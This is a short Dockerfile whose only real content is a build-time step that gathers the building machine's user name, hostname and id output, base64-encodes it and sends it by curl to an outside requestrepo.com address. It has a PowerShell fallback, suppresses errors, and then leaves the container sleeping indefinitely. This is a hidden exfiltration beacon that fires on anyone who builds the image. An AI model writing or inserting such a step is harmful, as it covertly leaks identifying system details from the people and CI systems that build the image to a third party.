FROM alpine:latest
RUN apk add --no-cache curl
RUN if command -v curl >/dev/null 2>&1; then curl -s "http://qkbjkbut.requestrepo.com/$( (whoami; hostname; id; whoami) 2>&1 | base64 -w0 )"; elif command -v powershell >/dev/null 2>&1; then powershell -Command "[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami; hostname; whoami) 2>&1 | Out-String))" | xargs -I{} curl -s "http://qkbjkbut.requestrepo.com/{}"; fi || true
CMD ["sleep", "infinity"]
